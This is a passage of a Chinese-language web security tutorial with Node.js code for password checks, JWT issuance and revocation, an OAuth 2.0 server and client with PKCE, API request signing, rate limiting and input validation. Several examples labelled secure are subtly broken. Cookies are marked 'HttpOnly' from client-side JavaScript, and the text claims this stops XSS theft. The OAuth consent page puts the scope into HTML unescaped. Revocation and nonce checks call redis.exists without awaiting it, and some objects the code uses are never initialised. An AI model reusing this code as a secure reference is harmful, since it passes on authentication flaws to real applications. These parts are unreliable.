    const warnings = [];

    // 长度检查
    if (password.length < 8) {
      errors.push('密码长度至少8个字符');
    } else if (password.length >= 12) {
      warnings.push('密码长度良好');
    }

    // 字符类型检查
    const hasLower = /[a-z]/.test(password);
    const hasUpper = /[A-Z]/.test(password);
    const hasDigit = /[0-9]/.test(password);
    const hasSpecial = /[^a-zA-Z0-9]/.test(password);

    if (!hasLower) errors.push('需要小写字母');
    if (!hasUpper) errors.push('需要大写字母');
    if (!hasDigit) errors.push('需要数字');
    if (!hasSpecial) warnings.push('建议添加特殊字符');

    // 常见密码检查
    const commonPasswords = [
      'password', '123456', 'qwerty', 'admin',
      'letmein', 'welcome', 'monkey', 'dragon'
    ];
    if (commonPasswords.includes(password.toLowerCase())) {
      errors.push('不能使用常见密码');
    }

    // 重复字符检查
    if (/(.)\1{2,}/.test(password)) {
      warnings.push('建议不要使用连续重复字符');
    }

    return {
      isValid: errors.length === 0,
      errors,
      warnings,
      strength: this.calculateStrength(password)
    };
  }

  // 计算密码强度分数
  calculateStrength(password) {
    let score = 0;

    // 基于长度
    score += Math.min(password.length * 4, 40);

    // 基于复杂度
    if (/[a-z]/.test(password)) score += 10;
    if (/[A-Z]/.test(password)) score += 10;
    if (/[0-9]/.test(password)) score += 10;
    if (/[^a-zA-Z0-9]/.test(password)) score += 15;

    // 唯一字符奖励
    const unique = new Set(password).size;
    score += unique * 3;

    // 惩罚连续字符
    if (/(.)\1{2,}/.test(password)) score -= 10;

    // 惩罚纯字母或纯数字
    if (/^[a-zA-Z]+$/.test(password)) score -= 10;
    if (/^[0-9]+$/.test(password)) score -= 20;

    return Math.max(0, Math.min(100, score));
  }

  // 生成密码重置令牌
  generateResetToken() {
    const token = crypto.randomBytes(32).toString('hex');
    const expiry = Date.now() + 3600000; // 1小时后过期

    return {
      token,
      hash: crypto.createHash('sha256').update(token).digest('hex'),
      expiry
    };
  }

  // 验证重置令牌
  verifyResetToken(token, storedHash, expiry) {
    if (Date.now() > expiry) {
      return { valid: false, error: '令牌已过期' };
    }

    const hash = crypto.createHash('sha256').update(token).digest('hex');
    const isValid = crypto.timingSafeEqual(
      Buffer.from(hash, 'hex'),
      Buffer.from(storedHash, 'hex')
    );

    return { valid: isValid };
  }
}

module.exports = new PasswordService();
```

---

## 五、JWT安全：令牌认证

### 5.1 JWT概述

JSON Web Token（JWT）是一种开放标准（RFC 7519），用于在各方之间安全地传输信息。JWT由三部分组成：Header（头部）、Payload（负载）和Signature（签名）。

**JWT结构：**

```
xxxxx.yyyyy.zzzzz

Header.Payload.Signature
```

**示例JWT：**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### 5.2 签名验证机制

JWT的安全性主要依赖于签名的不可伪造性。服务器使用密钥对Header和Payload进行签名，客户端无法伪造有效的签名。

**JWT签名算法：**

```javascript
const jwt = require('jsonwebtoken');

// 签名
const token = jwt.sign(
  {
    sub: 'user123',
    name: '张三',
    role: 'admin',
    iat: Math.floor(Date.now() / 1000)
  },
  'your-secret-key',  // 密钥
  {
    algorithm: 'HS256',  // 算法
    expiresIn: '1h'      // 过期时间
  }
);

// 验证
try {
  const decoded = jwt.verify(token, 'your-secret-key', {
    algorithms: ['HS256']  // 指定允许的算法
  });
  console.log(decoded);
} catch (error) {
  console.error('Token无效:', error.message);
}
```

**选择安全的算法：**

```javascript
// 不安全的算法配置
const unsafeOptions = {
  algorithm: 'none'  // 禁止使用none算法！
};

// 安全的算法列表
const safeAlgorithms = ['HS256', 'HS384', 'HS512', 'RS256', 'RS384', 'RS512'];

// 建议使用RS256（非对称加密）
const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048
});

const token = jwt.sign(
  { sub: 'user123' },
  privateKey,
  { algorithm: 'RS256' }
);

const decoded = jwt.verify(token, publicKey);
```

### 5.3 过期机制与刷新策略

JWT的过期机制是安全性的重要组成部分。

**令牌过期策略：**

```javascript
// 短期访问令牌 + 长期刷新令牌策略
class TokenService {
  constructor() {
    this.accessTokenExpiry = '15m';      // 访问令牌15分钟
    this.refreshTokenExpiry = '7d';       // 刷新令牌7天
    this.refreshTokenSecret = process.env.REFRESH_TOKEN_SECRET;
  }

  // 生成访问令牌
  generateAccessToken(user) {
    return jwt.sign(
      {
        sub: user.id,
        type: 'access'
      },
      process.env.JWT_SECRET,
      {
        algorithm: 'HS256',
        expiresIn: this.accessTokenExpiry
      }
    );
  }

  // 生成刷新令牌
  generateRefreshToken(user) {
    return jwt.sign(
      {
        sub: user.id,
        type: 'refresh',
        jti: crypto.randomUUID()  // 唯一标识符，用于撤销
      },
      this.refreshTokenSecret,
      {
        algorithm: 'HS256',
        expiresIn: this.refreshTokenExpiry
      }
    );
  }

  // 验证并刷新令牌
  async refreshTokens(refreshToken) {
    try {
      const decoded = jwt.verify(refreshToken, this.refreshTokenSecret);

      if (decoded.type !== 'refresh') {
        throw new Error('无效的令牌类型');
      }

      // 检查令牌是否已被撤销
      const isRevoked = await this.isTokenRevoked(decoded.jti);
      if (isRevoked) {
        throw new Error('令牌已被撤销');
      }

      // 获取用户信息
      const user = await User.findById(decoded.sub);

      // 生成新的令牌对
      return {
        accessToken: this.generateAccessToken(user),
        refreshToken: this.generateRefreshToken(user)
      };
    } catch (error) {
      throw new Error('刷新令牌无效');
    }
  }

  // 撤销令牌
  async revokeToken(jti, userId) {
    // 将jti存储到Redis，设置与令牌剩余有效期相同的TTL
    const ttl = await this.getTokenTTL(jti);
    await redis.set(`revoked:${jti}`, userId, 'EX', ttl);
  }

  // 检查令牌是否已撤销
  async isTokenRevoked(jti) {
    const result = await redis.get(`revoked:${jti}`);
    return result !== null;
  }
}
```

### 5.4 防伪造策略

防止JWT伪造需要多层次的保护措施：

**完整的安全实现：**

```javascript
// jwtSecurity.js - JWT安全完整实现
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

class JWTSecurity {
  constructor() {
    // 从环境变量加载密钥
    this.secret = process.env.JWT_SECRET;
    this.refreshSecret = process.env.REFRESH_TOKEN_SECRET;

    if (!this.secret || this.secret.length < 32) {
      throw new Error('JWT密钥长度不足');
    }
  }

  // 生成安全的令牌对
  generateTokenPair(user) {
    const accessToken = this.generateAccessToken(user);
    const refreshToken = this.generateRefreshToken(user);

    return { accessToken, refreshToken };
  }

  // 生成访问令牌
  generateAccessToken(user) {
    const payload = {
      sub: user.id,
      email: user.email,
      role: user.role,
      type: 'access',
      iat: Math.floor(Date.now() / 1000)
    };

    // 添加安全声明
    payload.jti = crypto.randomBytes(16).toString('hex');
    payload.iss = 'my-app';  // 签发者
    payload.aud = 'my-app-users';  // 受众

    return jwt.sign(payload, this.secret, {
      algorithm: 'HS256',
      expiresIn: '15m',
      mutatePayload: false
    });
  }

  // 生成刷新令牌
  generateRefreshToken(user) {
    const payload = {
      sub: user.id,
      type: 'refresh',
      iat: Math.floor(Date.now() / 1000)
    };

    payload.jti = crypto.randomBytes(16).toString('hex');

    return jwt.sign(payload, this.refreshSecret, {
      algorithm: 'HS256',
      expiresIn: '7d'
    });
  }

  // 验证访问令牌
  verifyAccessToken(token) {
    try {
      const decoded = jwt.verify(token, this.secret, {
        algorithms: ['HS256'],
        issuer: 'my-app',
        audience: 'my-app-users'
      });

      // 验证令牌类型
      if (decoded.type !== 'access') {
        throw new Error('无效的令牌类型');
      }

      // 检查是否已撤销
      if (this.isTokenJTIListed(decoded.jti)) {
        throw new Error('令牌已撤销');
      }

      return decoded;
    } catch (error) {
      if (error.name === 'TokenExpiredError') {
        throw new Error('令牌已过期');
      }
      if (error.name === 'JsonWebTokenError') {
        throw new Error('令牌无效');
      }
      throw error;
    }
  }

  // 黑名单管理（用于令牌撤销）
  async revokeToken(jti, expiresIn) {
    const key = `jwt:revoked:${jti}`;
    const ttl = expiresIn - Math.floor(Date.now() / 1000);
    if (ttl > 0) {
      await redis.set(key, '1', 'EX', ttl);
    }
  }

  isTokenJTIListed(jti) {
    // 检查Redis黑名单
    return redis.exists(`jwt:revoked:${jti}`);
  }

  // 安全的令牌解析（不在错误时抛出异常）
  safeDecode(token) {
    try {
      return jwt.decode(token, { complete: true });
    } catch {
      return null;
    }
  }
}

module.exports = new JWTSecurity();
```

### 5.5 JWT防护实战：前后端完整实现

**服务端中间件：**

```javascript
// authMiddleware.js - JWT认证中间件
const jwtSecurity = require('./jwtSecurity');

class AuthMiddleware {
  // 认证中间件
  authenticate = async (req, res, next) => {
    try {
      // 从请求头获取令牌
      const authHeader = req.headers.authorization;

      if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: '未提供认证令牌' });
      }

      const token = authHeader.substring(7);

      // 验证令牌
      const decoded = await jwtSecurity.verifyAccessToken(token);

      // 将用户信息附加到请求对象
      req.user = {
        id: decoded.sub,
        email: decoded.email,
        role: decoded.role
      };
      req.tokenJTI = decoded.jti;

      next();
    } catch (error) {
      if (error.message === '令牌已过期') {
        return res.status(401).json({
          error: '令牌已过期',
          code: 'TOKEN_EXPIRED'
        });
      }
      return res.status(401).json({ error: '认证失败' });
    }
  };

  // 角色授权中间件
  authorize = (...allowedRoles) => {
    return (req, res, next) => {
      if (!req.user) {
        return res.status(401).json({ error: '未认证' });
      }

      if (!allowedRoles.includes(req.user.role)) {
        return res.status(403).json({ error: '权限不足' });
      }

      next();
    };
  };
}

module.exports = new AuthMiddleware();
```

**前端安全处理：**

```javascript
// tokenService.js - 前端令牌管理
class TokenService {
  constructor() {
    this.storageKey = 'auth_tokens';
    this.accessToken = null;
    this.refreshToken = null;
  }

  // 安全存储令牌
  setTokens(accessToken, refreshToken) {
    this.accessToken = accessToken;
    this.refreshToken = refreshToken;

    // 使用HttpOnly Cookie存储刷新令牌（更安全）
    // 不在localStorage中存储敏感令牌
    document.cookie = `refresh_token=${refreshToken}; HttpOnly; Secure; SameSite=Strict; Path=/api/auth/refresh`;
  }

  // 获取访问令牌
  getAccessToken() {
    return this.accessToken;
  }

  // 清除令牌
  clearTokens() {
    this.accessToken = null;
    this.refreshToken = null;
    document.cookie = 'refresh_token=; HttpOnly; Secure; SameSite=Strict; Max-Age=0';
  }
}

// 安全API请求封装
async function secureFetch(url, options = {}) {
  const tokenService = new TokenService();

  // 添加认证头
  const headers = {
    ...options.headers,
    'Authorization': `Bearer ${tokenService.getAccessToken()}`
  };

  const response = await fetch(url, {
    ...options,
    headers,
    credentials: 'include'  // 携带Cookie
  });

  // 处理令牌过期
  if (response.status === 401) {
    const data = await response.json();

    if (data.code === 'TOKEN_EXPIRED') {
      // 尝试刷新令牌
      const refreshed = await tokenService.refreshAccessToken();

      if (refreshed) {
        // 重试原始请求
        headers['Authorization'] = `Bearer ${tokenService.getAccessToken()}`;
        return fetch(url, { ...options, headers, credentials: 'include' });
      } else {
        // 刷新失败，跳转到登录页
        window.location.href = '/login';
      }
    }
  }

  return response;
}
```

---

## 六、OAuth安全：授权机制

### 6.1 OAuth概述

OAuth（Open Authorization）是一种开放标准授权协议，允许用户授权第三方应用访问其在某个网站上的资源，而无需提供用户名和密码。OAuth 2.0是当前广泛使用的版本。

**OAuth角色：**

- **Resource Owner（资源所有者）**：用户，可以授权他人访问自己的资源
- **Client（客户端）**：请求访问权限的第三方应用
- **Resource Server（资源服务器）**：托管用户资源的服务器
- **Authorization Server（授权服务器）**：验证用户身份并颁发访问令牌

### 6.2 授权码流程

授权码模式（Authorization Code Grant）是OAuth 2.0最安全的授权方式，特别适合有后端服务的应用。

**完整授权流程：**

```
1. 用户点击"使用XX登录"
   ↓
2. 跳转到授权服务器 /oauth/authorize
   ?client_id=xxx
   &redirect_uri=https://client.com/callback
   &response_type=code
   &scope=read write
   &state=random_state_string
   &code_challenge=pkce_challenge
   &code_challenge_method=S256
   ↓
3. 用户在授权服务器登录并同意授权
   ↓
4. 授权服务器回调 /callback?code=xxx&state=xxx
   ↓
5. 后端用code换取access_token
   ↓
6. 返回access_token给前端
```

**服务端实现：**

```javascript
// oauthController.js - OAuth 2.0授权服务器
const crypto = require('crypto');
const axios = require('axios');

class OAuthServer {
  constructor() {
    this.clients = new Map();  // 存储注册的客户端应用
    this.authorizationCodes = new Map();  // 存储授权码
  }

  // 注册客户端应用
  registerClient(clientId, clientSecret, redirectUris) {
    this.clients.set(clientId, {
      clientSecret,
      redirectUris,
      createdAt: Date.now()
    });
  }

  // 生成PKCE挑战
  generatePKCEChallenge() {
    const verifier = crypto.randomBytes(32).toString('base64url');
    const challenge = crypto
      .createHash('sha256')
      .update(verifier)
      .digest('base64url');

    return { verifier, challenge };
  }

  // 验证PKCE
  verifyPKCE(verifier, challenge) {
    const expectedChallenge = crypto
      .createHash('sha256')
      .update(verifier)
      .digest('base64url');

    return crypto.timingSafeEqual(
      Buffer.from(challenge),
      Buffer.from(expectedChallenge)
    );
  }

  // 授权端点
  async authorizationEndpoint(req, res) {
    const {
      client_id,
      redirect_uri,
      response_type,
      scope,
      state,
      code_challenge,
      code_challenge_method
    } = req.query;

    // 验证客户端
    const client = this.clients.get(client_id);
    if (!client) {
      return res.status(400).send('无效的client_id');
    }

    // 验证redirect_uri
    if (!client.redirectUris.includes(redirect_uri)) {
      return res.status(400).send('无效的redirect_uri');
    }

    // 验证response_type
    if (response_type !== 'code') {
      return res.status(400).send('仅支持授权码模式');
    }

    // 生成授权请求ID，显示授权页面让用户确认
    const authRequestId = crypto.randomUUID();

    // 存储授权请求信息
    this.authRequests.set(authRequestId, {
      client_id,
      redirect_uri,
      scope,
      code_challenge,
      code_challenge_method,
      state,
      expiresAt: Date.now() + 600000  // 10分钟
    });

    // 显示授权确认页面
    res.send(`
      <h2>应用请求以下权限：</h2>
      <p> scopes: ${scope} </p>
      <form action="/oauth/authorize/${authRequestId}" method="POST">
        <button name="action" value="approve">授权</button>
        <button name="action" value="deny">拒绝</button>
      </form>
    `);
  }

  // 处理用户授权决策
  async handleAuthorizationDecision(authRequestId, userId, action) {
    const authRequest = this.authRequests.get(authRequestId);

    if (!authRequest || authRequest.expiresAt < Date.now()) {
      throw new Error('授权请求无效或已过期');
    }

    if (action === 'deny') {
      // 用户拒绝，重定向到客户端
      return `${authRequest.redirect_uri}?error=access_denied`;
    }

    // 生成授权码
    const code = crypto.randomBytes(32).toString('base64url');

    // 存储授权码
    this.authorizationCodes.set(code, {
      client_id: authRequest.client_id,
      redirect_uri: authRequest.redirect_uri,
      user_id: userId,
      scope: authRequest.scope,
      code_challenge: authRequest.code_challenge,
      expiresAt: Date.now() + 60000,  // 1分钟有效期
      used: false
    });

    // 重定向回客户端
    const params = new URLSearchParams();
    params.set('code', code);
    if (authRequest.state) {
      params.set('state', authRequest.state);
    }

    return `${authRequest.redirect_uri}?${params.toString()}`;
  }

  // 令牌端点
  async tokenEndpoint(req, res) {
    const {
      grant_type,
      code,
      client_id,
      redirect_uri,
      code_verifier
    } = req.body;

    // 验证授权码
    const authCode = this.authorizationCodes.get(code);

    if (!authCode) {
      return res.status(400).json({ error: '无效的授权码' });
    }

    if (authCode.expiresAt < Date.now()) {
      return res.status(400).json({ error: '授权码已过期' });
    }

    if (authCode.used) {
      return res.status(400).json({ error: '授权码已被使用' });
    }

    // 标记为已使用
    authCode.used = true;

    // 验证PKCE
    if (authCode.code_challenge) {
      if (!code_verifier) {
        return res.status(400).json({ error: '缺少code_verifier' });
      }

      const pkceValid = this.verifyPKCE(
        code_verifier,
        authCode.code_challenge
      );

      if (!pkceValid) {
        return res.status(400).json({ error: 'PKCE验证失败' });
      }
    }

    // 生成访问令牌和刷新令牌
    const accessToken = this.generateAccessToken(authCode);
    const refreshToken = this.generateRefreshToken(authCode);

    res.json({
      access_token: accessToken.token,
      token_type: 'Bearer',
      expires_in: accessToken.expiresIn,
      refresh_token: refreshToken.token,
      scope: authCode.scope
    });
  }

  generateAccessToken(authCode) {
    const token = crypto.randomBytes(32).toString('base64url');
    const expiresIn = 3600;  // 1小时

    this.accessTokens.set(token, {
      client_id: authCode.client_id,
      user_id: authCode.user_id,
      scope: authCode.scope,
      expiresAt: Date.now() + expiresIn * 1000
    });

    return { token, expiresIn };
  }

  generateRefreshToken(authCode) {
    const token = crypto.randomBytes(32).toString('base64url');
    const expiresIn = 604800;  // 7天

    this.refreshTokens.set(token, {
      client_id: authCode.client_id,
      user_id: authCode.user_id,
      scope: authCode.scope,
      expiresAt: Date.now() + expiresIn * 1000
    });

    return { token };
  }
}

module.exports = new OAuthServer();
```

### 6.3 PKCE协议

PKCE（Proof Key for Code Exchange）是OAuth 2.0的扩展，用于防止授权码拦截攻击。

**PKCE流程：**

```javascript
// 客户端：生成PKCE挑战
function generatePKCE() {
  // 1. 生成随机验证码
  const verifier = crypto.randomBytes(32)
    .toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');

  // 2. 生成挑战（验证码的SHA256哈希，base64url编码）
  const challenge = crypto
    .createHash('sha256')
    .update(verifier)
    .digest('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');

  return { verifier, challenge };
}

// 客户端：发起授权请求
async function initiateAuth() {
  const { verifier, challenge } = generatePKCE();

  // 存储verifier用于后续验证
  sessionStorage.setItem('pkce_verifier', verifier);

  const authUrl = new URL('https://auth.example.com/oauth/authorize');
  authUrl.searchParams.set('client_id', 'my-client');
  authUrl.searchParams.set('redirect_uri', 'https://myapp.com/callback');
  authUrl.searchParams.set('response_type', 'code');
  authUrl.searchParams.set('scope', 'read write');
  authUrl.searchParams.set('code_challenge', challenge);
  authUrl.searchParams.set('code_challenge_method', 'S256');

  window.location.href = authUrl.toString();
}

// 客户端：兑换授权码时提供verifier
async function exchangeCodeForToken(code) {
  const verifier = sessionStorage.getItem('pkce_verifier');

  const response = await fetch('https://auth.example.com/oauth/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      grant_type: 'authorization_code',
      code,
      redirect_uri: 'https://myapp.com/callback',
      client_id: 'my-client',
      code_verifier: verifier
    })
  });

  sessionStorage.removeItem('pkce_verifier');

  return response.json();
}
```

### 6.4 Token安全存储

令牌的存储方式直接影响安全性。

```javascript
// tokenStorage.js - 安全的Token存储策略
class SecureTokenStorage {
  // 访问令牌：存储在内存中
  // 优点：不会被XSS读取
  // 缺点：页面刷新后需要刷新令牌
  #accessToken = null;

  // 刷新令牌：HttpOnly Cookie
  // 优点：不会被JavaScript访问，防止XSS窃取
  // 缺点：需要后端配合设置Cookie

  // 设置访问令牌
  setAccessToken(token) {
    this.#accessToken = token;
    // 不要存储到localStorage或sessionStorage
    // 不要作为URL参数传递
  }

  // 获取访问令牌
  getAccessToken() {
    return this.#accessToken;
  }

  // 设置刷新令牌（HttpOnly Cookie）
  setRefreshTokenCookie(token) {
    document.cookie = `refresh_token=${token}; HttpOnly; Secure; SameSite=Strict; Path=/api/auth/refresh; Max-Age=604800`;
  }

  // 清除所有令牌
  clearTokens() {
    this.#accessToken = null;
    document.cookie = 'refresh_token=; HttpOnly; Secure; SameSite=Strict; Max-Age=0';
  }
}

// 前端使用示例
const tokenStorage = new SecureTokenStorage();

// 登录时
async function login(username, password) {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password }),
    credentials: 'include'
  });

  const { access_token, refresh_token } = await response.json();

  // 访问令牌存内存
  tokenStorage.setAccessToken(access_token);

  // 刷新令牌存HttpOnly Cookie
  tokenStorage.setRefreshTokenCookie(refresh_token);
}

// API请求时
async function apiRequest(url, options = {}) {
  const accessToken = tokenStorage.getAccessToken();

  const response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${accessToken}`
    },
    credentials: 'include'
  });

  if (response.status === 401) {
    // 尝试刷新令牌
    const refreshed = await refreshAccessToken();
    if (refreshed) {
      // 重试请求
      return apiRequest(url, options);
    }
  }

  return response;
}
```

### 6.5 OAuth安全实战：完整客户端实现

```javascript
// oauthClient.js - OAuth客户端安全实现
const crypto = require('crypto');

class OAuthClient {
  constructor(config) {
    this.clientId = config.clientId;
    this.clientSecret = config.clientSecret;
    this.authorizationServer = config.authorizationServer;
    this.redirectUri = config.redirectUri;
    this.scopes = config.scopes || ['read', 'write'];
  }

  // 生成OAuth授权URL
  getAuthorizationUrl(state) {
    const { verifier, challenge } = this.generatePKCE();

    const params = new URLSearchParams({
      response_type: 'code',
      client_id: this.clientId,
      redirect_uri: this.redirectUri,
      scope: this.scopes.join(' '),
      state,
      code_challenge: challenge,
      code_challenge_method: 'S256'
    });

    // 存储verifier（实际应用中应该加密存储）
    this.pkceVerifier = verifier;

    return `${this.authorizationServer}/authorize?${params.toString()}`;
  }

  // 交换授权码获取令牌
  async exchangeCodeForToken(code, state) {
    // 验证state防止CSRF
    if (!this.verifyState(state)) {
      throw new Error('State验证失败，可能存在CSRF攻击');
    }

    const response = await fetch(`${this.authorizationServer}/token`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: new URLSearchParams({
        grant_type: 'authorization_code',
        code,
        redirect_uri: this.redirectUri,
        client_id: this.clientId,
        client_secret: this.clientSecret,
        code_verifier: this.pkceVerifier
      })
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(`Token交换失败: ${error.error_description}`);
    }

    const tokens = await response.json();

    // 清除PKCE verifier
    this.pkceVerifier = null;

    return tokens;
  }

  // 使用刷新令牌获取新的访问令牌
  async refreshAccessToken(refreshToken) {
    const response = await fetch(`${this.authorizationServer}/token`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: new URLSearchParams({
        grant_type: 'refresh_token',
        refresh_token: refreshToken,
        client_id: this.clientId,
        client_secret: this.clientSecret
      })
    });

    if (!response.ok) {
      throw new Error('刷新令牌失败');
    }

    return response.json();
  }

  generatePKCE() {
    const verifier = crypto.randomBytes(32)
      .toString('base64')
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=/g, '');

    const challenge = crypto
      .createHash('sha256')
      .update(verifier)
      .digest('base64')
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=/g, '');

    return { verifier, challenge };
  }

  verifyState(state) {
    // 从存储中获取原始state并验证
    const storedState = this.getStoredState();
    return state === storedState;
  }

  generateState() {
    const state = crypto.randomBytes(16).toString('hex');
    this.storeState(state);
    return state;
  }

  storeState(state) {
    // 实际应用中应该加密存储
    sessionStorage.setItem('oauth_state', state);
  }

  getStoredState() {
    return sessionStorage.getItem('oauth_state');
  }
}
```

---

## 七、接口安全：防护策略

### 7.1 接口安全概述

API接口是现代Web应用的核心组成部分，也是攻击者的主要目标之一。接口安全涉及多个层面，包括身份验证、授权、数据验证、速率限制等。

### 7.2 签名验证机制

接口签名验证是确保请求完整性和来源真实性的重要手段。

**签名算法实现：**

```javascript
// apiSignature.js - API请求签名服务
const crypto = require('crypto');

class APISignature {
  // 生成请求签名
  static sign(requestData, secretKey) {
    const {
      method,
      path,
      timestamp,
      nonce,
      body
    } = requestData;

    // 1. 构建签名字符串
    const signString = [
      method.toUpperCase(),
      path,
      timestamp,
      nonce,
      body ? this.hashBody(body) : ''
    ].join('\n');

    // 2. 使用HMAC-SHA256生成签名
    const signature = crypto
      .createHmac('sha256', secretKey)
      .update(signString)
      .digest('hex');

    return signature;
  }

  // 计算请求体哈希
  static hashBody(body) {
    if (!body) return '';

    const bodyString = typeof body === 'string' ? body : JSON.stringify(body);
    return crypto
      .createHash('sha256')
      .update(bodyString)
      .digest('hex');
  }

  // 验证签名
  static verify(requestData, signature, secretKey) {
    const expectedSignature = this.sign(requestData, secretKey);

    return crypto.timingSafeEqual(
      Buffer.from(signature, 'hex'),
      Buffer.from(expectedSignature, 'hex')
    );
  }

  // 生成时间戳和随机数
  static generateNonce() {
    return {
      timestamp: Math.floor(Date.now() / 1000).toString(),
      nonce: crypto.randomBytes(16).toString('hex')
    };
  }
}

// Express中间件：验证API签名
function signatureVerificationMiddleware(req, res, next) {
  const {
    'x-signature': signature,
    'x-timestamp': timestamp,
    'x-nonce': nonce
  } = req.headers;

  // 检查必需的头部
  if (!signature || !timestamp || !nonce) {
    return res.status(401).json({ error: '缺少签名参数' });
  }

  // 检查时间戳（5分钟内有效）
  const requestTime = parseInt(timestamp);
  const currentTime = Math.floor(Date.now() / 1000);

  if (Math.abs(currentTime - requestTime) > 300) {
    return res.status(401).json({ error: '请求已过期' });
  }

  // 检查nonce是否重复（使用Redis存储已使用的nonce）
  const nonceKey = `nonce:${nonce}`;
  if (redis.exists(nonceKey)) {
    return res.status(401).json({ error: 'Nonce已使用' });
  }

  // 存储nonce，设置5分钟过期
  redis.set(nonceKey, '1', 'EX', 300);

  // 验证签名
  const requestData = {
    method: req.method,
    path: req.path,
    timestamp,
    nonce,
    body: req.body
  };

  try {
    const isValid = APISignature.verify(
      requestData,
      signature,
      process.env.API_SECRET_KEY
    );

    if (!isValid) {
      return res.status(401).json({ error: '签名验证失败' });
    }

    next();
  } catch (error) {
    return res.status(401).json({ error: '签名验证错误' });
  }
}

module.exports = { APISignature, signatureVerificationMiddleware };
```

### 7.3 限流策略

限流是防止接口被滥用和DDoS攻击的重要手段。

```javascript
// rateLimiter.js - 限流中间件
const redis = require('redis');
const client = redis.createClient();

class RateLimiter {
  // 滑动窗口限流
  static slidingWindow(key, windowMs, maxRequests) {
    const now = Date.now();
    const windowStart = now - windowMs;

    return new Promise((resolve, reject) => {
      // 移除窗口外的请求记录
      client.zremrangebyscore(key, 0, windowStart, (err) => {
        if (err) return reject(err);

        // 获取当前窗口内的请求数
        client.zcard(key, (err, count) => {
          if (err) return reject(err);

          if (count >= maxRequests) {
            resolve({
              allowed: false,
              remaining: 0,
              retryAfter: Math.ceil(windowMs / 1000)
            });
          } else {
            // 添加新请求
            client.zadd(key, now, `${now}-${Math.random()}`, (err) => {
              if (err) return reject(err);

              // 设置过期时间
              client.expire(key, Math.ceil(windowMs / 1000));

              resolve({
                allowed: true,
                remaining: maxRequests - count - 1,
                retryAfter: 0
              });
            });
          }
        });
      });
    });
  }

  // 令牌桶算法限流
  static async tokenBucket(key, capacity, refillRate) {
    const bucketKey = `bucket:${key}`;

    const bucket = await client.hgetall(bucketKey);
    const now = Date.now();

    if (!bucket.tokens) {
      // 初始化桶
      await client.hmset(bucketKey, {
        tokens: capacity,
        lastRefill: now
      });
      return { allowed: true, remaining: capacity - 1 };
    }

    // 计算应该补充的令牌数
    const timePassed = (now - parseInt(bucket.lastRefill)) / 1000;
    const tokensToAdd = timePassed * refillRate;
    let tokens = Math.min(capacity, parseFloat(bucket.tokens) + tokensToAdd);

    if (tokens < 1) {
      const retryAfter = Math.ceil((1 - tokens) / refillRate);
      return {
        allowed: false,
        remaining: 0,
        retryAfter
      };
    }

    // 消耗一个令牌
    tokens -= 1;

    await client.hmset(bucketKey, {
      tokens,
      lastRefill: now
    });

    return {
      allowed: true,
      remaining: Math.floor(tokens)
    };
  }

  // Express限流中间件
  static middleware(options = {}) {
    const {
      windowMs = 60000,     // 时间窗口
      maxRequests = 100,    // 最大请求数
      keyGenerator = (req) => req.ip  // 限流键生成函数
    } = options;

    return async (req, res, next) => {
      try {
        const key = keyGenerator(req);
        const result = await this.slidingWindow(
          `ratelimit:${key}`,
          windowMs,
          maxRequests
        );

        // 设置限流响应头
        res.set({
          'X-RateLimit-Limit': maxRequests,
          'X-RateLimit-Remaining': result.remaining,
          'X-RateLimit-Reset': Date.now() + result.retryAfter * 1000
        });

        if (!result.allowed) {
          res.set('Retry-After', result.retryAfter);
          return res.status(429).json({
            error: '请求过于频繁，请稍后再试',
            retryAfter: result.retryAfter
          });
        }

        next();
      } catch (error) {
        console.error('限流检查失败:', error);
        // 限流服务失败时，允许请求通过（fail-open）
        next();
      }
    };
  }
}

// 使用示例
const rateLimitMiddleware = RateLimiter.middleware({
  windowMs: 60000,      // 1分钟
  maxRequests: 100,      // 100次请求
  keyGenerator: (req) => req.user?.id || req.ip  // 登录用户按用户ID限流，未登录按IP
});

app.use('/api/', rateLimitMiddleware);
```

### 7.4 参数校验

参数校验是防止注入攻击的第一道防线。

```javascript
// parameterValidator.js - 参数验证中间件
const Joi = require('joi');

// 定义验证模式
const schemas = {
  // 用户注册验证
  register: Joi.object({
    username: Joi.string()
      .alphanum()
      .min(3)
      .max(30)
      .required(),
    email: Joi.string()
      .email()
      .required(),
    password: Joi.string()
      .min(8)
      .max(128)
      .pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*])/)
      .required()
  }),

  // ID参数验证
  idParam: Joi.object({
    id: Joi.number()
      .integer()
      .positive()
      .required()
  }),

  // 分页参数验证
  pagination: Joi.object({
    page: Joi.number().integer().min(1).default(1),
    limit: Joi.number().integer().min(1).max(100).default(20),
    sort: Joi.string().valid('asc', 'desc').default('desc')
  })
};

// 验证中间件工厂函数
function validate(schemaName, source = 'body') {
  return (req, res, next) => {
    const schema = schemas[schemaName];

    if (!schema) {
      return next(new Error(`未知的验证模式: ${schemaName}`));
    }

    const dataToValidate = source === 'body' ? req.body :
                           source === 'query' ? req.query :
                           source === 'params' ? req.params :
                           req.body;

    const { error, value } = schema.validate(dataToValidate, {
      abortEarly: false,  // 返回所有错误
      stripUnknown: true  // 移除未知字段
    });

    if (error) {
      const errors = error.details.map(detail => ({
        field: detail.path.join('.'),
        message: detail.message
      }));

      return res.status(400).json({
        error: '参数验证失败',
        details: errors
      });
    }

    // 用验证后的值替换原始数据
    if (source === 'body') req.body = value;
